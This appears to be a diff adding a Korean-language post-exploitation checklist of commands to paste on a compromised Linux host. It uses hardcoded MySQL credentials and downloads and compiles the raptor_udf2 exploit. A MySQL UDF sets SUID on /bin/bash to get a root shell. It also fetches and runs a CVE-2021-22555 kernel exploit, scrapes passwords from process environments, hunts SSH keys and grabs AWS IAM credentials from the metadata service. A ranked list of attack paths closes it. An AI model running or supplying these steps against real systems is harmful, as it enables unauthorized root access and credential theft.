@@ -1,0 +1,154 @@
+=== 타겟에서 즉시 실행할 명령어 (복사해서 붙여넣기) ===
+
+========================================
+1단계: MySQL 설정 확인 (가장 중요!)
+========================================
+
+mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@plugin_dir; SELECT @@secure_file_priv; SELECT VERSION();"
+
+mysql -u webuser -p'WebPassw0rd!' -e "SELECT user, host, Super_priv, File_priv FROM mysql.user WHERE user='webuser';"
+
+mysql -u webuser -p'WebPassw0rd!' -e "SHOW GRANTS;"
+
+
+========================================
+2단계: MySQL UDF 권한 상승 (@@secure_file_priv가 NULL이면 성공 가능!)
+========================================
+
+cd /tmp
+wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
+export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+ls -la raptor_udf2.so
+file raptor_udf2.so
+
+# MySQL에 로드
+mysql -u webuser -p'WebPassw0rd!' << 'EOF'
+USE mysql;
+CREATE TABLE IF NOT EXISTS foo(line blob);
+DELETE FROM foo;
+INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
+SELECT * FROM foo INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
+CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
+SELECT do_system('chmod u+s /bin/bash');
+EOF
+
+# 확인
+ls -la /bin/bash
+
+# Root 쉘
+/bin/bash -p
+whoami
+
+
+========================================
+3단계: CVE-2021-22555 (Netfilter)
+========================================
+
+cd /tmp
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve.c
+gcc -o cve cve.c -static
+./cve
+whoami
+
+
+========================================
+4단계: Python 확인 및 사용
+========================================
+
+which python3
+python3 --version
+
+# Python이 있으면 추가 exploit 가능
+
+
+========================================
+5단계: Splunk 확인
+========================================
+
+ps aux | grep splunk | grep root
+find /opt/splunk* -writable -type d 2>/dev/null | head -10
+
+
+========================================
+6단계: Cron Jobs 확인
+========================================
+
+cat /etc/crontab
+ls -la /etc/cron.d/
+cat /etc/cron.d/* 2>/dev/null
+find /etc/cron* -writable 2>/dev/null
+test -w /etc/cron.d && echo "WRITABLE!"
+
+
+========================================
+7단계: 프로세스 메모리 검색
+========================================
+
+cd /tmp
+for pid in /proc/[0-9]*/environ; do cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i "pass"; done | grep -v "LESSOPEN" | head -20
+
+
+========================================
+8단계: SSH 키 및 다른 사용자
+========================================
+
+cat /etc/passwd | grep "/bin/bash" | grep -v "^root"
+ls -la /home/
+find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null
+find /home -name "authorized_keys" 2>/dev/null
+
+
+========================================
+9단계: AWS 메타데이터 (새 크레덴셜)
+========================================
+
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+echo "Token: $TOKEN"
+ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+echo "Role: $ROLE"
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null | python3 -m json.tool
+
+
+========================================
+10단계: 웹 애플리케이션 재확인
+========================================
+
+# phpMyAdmin 확인
+ls -la /var/www/html/phpmyadmin/
+
+# 업로드 기능
+ls -la /var/www/html/www/upload.php
+ls -la /var/www/html/www/profile.php
+
+# writable 디렉토리
+find /var/www -writable -type d 2>/dev/null | head -10
+
+# 설정 파일에서 비밀번호
+grep -r "password\|passwd\|pwd" /var/www/html --include="*.php" 2>/dev/null | grep -i "root\|admin" | head -20
+
+
+========================================
+우선순위
+========================================
+
+1. MySQL UDF (2단계) ⭐⭐⭐⭐⭐
+   - @@secure_file_priv가 NULL이면 거의 확실
+
+2. CVE-2021-22555 (3단계) ⭐⭐⭐⭐
+
+3. Cron Jobs (6단계) ⭐⭐⭐
+   - writable cron 파일 있으면 즉시 성공
+
+4. Splunk (5단계) ⭐⭐⭐
+   - root로 실행되면 악용 가능
+
+5. 프로세스 메모리 (7단계) ⭐⭐
+   - root 비밀번호나 SSH 키 발견 가능
+
+6. AWS 메타데이터 (9단계) ⭐⭐
+   - 새 크레덴셜 얻을 수 있음
+
+7. 웹 애플리케이션 (10단계) ⭐⭐
+   - 파일 업로드로 더 좋은 쉘 얻기
